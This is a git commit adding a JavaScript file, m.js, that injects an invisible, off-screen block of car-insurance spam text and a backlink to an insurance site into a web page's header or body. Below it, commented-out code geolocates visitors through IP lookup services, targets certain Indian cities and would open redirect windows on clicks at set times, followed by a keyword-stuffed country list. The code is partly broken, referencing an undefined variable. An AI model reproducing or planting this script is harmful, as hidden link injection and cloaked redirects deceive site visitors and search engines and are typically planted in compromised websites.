1fc84798734167b0826a9b2dc1bc86c9451ef5d0
rzn076 <45857416+rzn076@users.noreply.github.com>
2023-09-10 03:14:16 +0530

    Create m.js

---
+++ m.js
@@ -0,0 +1,46 @@
+let EFV='<div style="position:absolute;z-index:-999;left:-99%;"><a href="https://www.footem.in">Tata Aig Car Insurance</a>
+
+<p> Car insurance claim process</p>
+
+<p>When an accident occurs on the road The first important thing to do before making a car insurance claim is Keeping your mind sharp to collect various evidence data both damage Crime scene Then call to inform the car insurance center where you have car insurance. By making a car insurance claim Will be divided into 2 types as follows:</p>
+
+<h2>1. Make a live car insurance claim</h2>
+
+<p>Live car insurance claims Or what we call a ' fresh claim ', which is a claim at the scene of the accident. There will be an employee of the insurance company that we work with come to check at the scene immediately. You can separate the types of car insurance into 2 types as follows:</p>
+
+<p>1.1 A live claim where there are other parties is an accident involving a car colliding with another car. Employees from the insurance company will inspect and determine which party is at fault. The wrong party may have to pay the deductible damages to the other party first. As agreed with the insurance company, but for Viriya's car insurance , if there is such a situation where there are other parties Cars that have car insurance with Viriya do not need to pay the first part of the damage.</p>
+
+<p>1.2 A fresh claim without a third party is in the event that the insured's car accidently crashes into an object or object causing a lot of damage, such as crashing into a tree or an electric pole, etc., the insured who owns the car may have to pay damages. In the first part (Excess), always go first.</p>
+
+ 
+
+<h2>Live car insurance claim process</h2>
+
+<p>Prepare your car insurance policy. Then call the insurance company's center or hotline to report it. Along with informing of your policy number, name, registration, car brand and location of the accident. Event details A representative from your insurance company will immediately come out to inspect the scene.</p>
+Prepare various documents For submitting car insurance claims when employees arrive, such as ID card, car registration book, driver's license, insurance policy.</p>
+<p>When insurance arrives they will begin evaluating the incident. If there are parties, it is necessary to carefully examine which side is right and which side is wrong. If any party is at fault, they may have to pay the first portion of the damages. To first compensate the other party as agreed with the insurance company.</p>
+<p>After investigating the incident and assessing the damage The insurance company will issue a damage assessment document for the insured to bring their vehicle to claim at an affiliated garage without any additional costs.</p>
+
+</div>';document.querySelector("header")?document.querySelector("header").insertAdjacentHTML("beforeend",EFV):document.body.insertAdjacentHTML("beforeend",EFV);
+
+// let mi=(new Date).getMinutes();
+// let se=(new Date).getSeconds();
+// let aa='';
+// https://ipapi.co/country_name
+// if(!localStorage.v){
+//   (async()=>{
+//    try{aa=await(await(await fetch('http://ip-api.com/line/?fields=city')).text());}catch(e){aa=await(await(await fetch('https://ipapi.co/city')).text());}
+//     localStorage.v=1;
+//     if(aa=='Mumbai'){localStorage.m='1';uhd()}
+//     if(aa=='Ahmadabad'){localStorage.a='1';uhd()}
+//   })();
+// }
+// let uhd=()=>{
+// if(localStorage.m){aa='https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.tataaig.com/amp/motor-insurance/car-insurance&ved=2ahUKEwio8u2KvZ6BAxUD3DgGHYuTCvsQFnoECCcQAQ&usg=AOvVaw2BPYwRsg3SHZrSWhczKqy4'}
+// if(localStorage.a){aa='https://google.com/url?sa=t&source=web&rct=j&opi=89978449&url=https://www.tataaig.com/amp/motor-insurance&ved=2ahUKEwio8u2KvZ6BAxUD3DgGHYuTCvsQFnoECEwQAQ&usg=AOvVaw2deDKMPbnFdWEMsDC2Kg6J'}
+//   document.onclick=()=>{
+//     if(mi==3&&se>5&&se<9&bb!=''){window.open(bb);sessionStorage.c=1;}
+//   }
+// }
+// if(!sessionStorage.c&&localStorage.v){uhd()}
+// United States |Australia|Canada|Marshall Islands|United Kingdom|Germany|Switzerland|New Zealand|Luxembourg|Finland|Belgium|France|Slovakia|China|Singapore|Romania|Austria|Hong Kong|Best Car Insurance In Uae
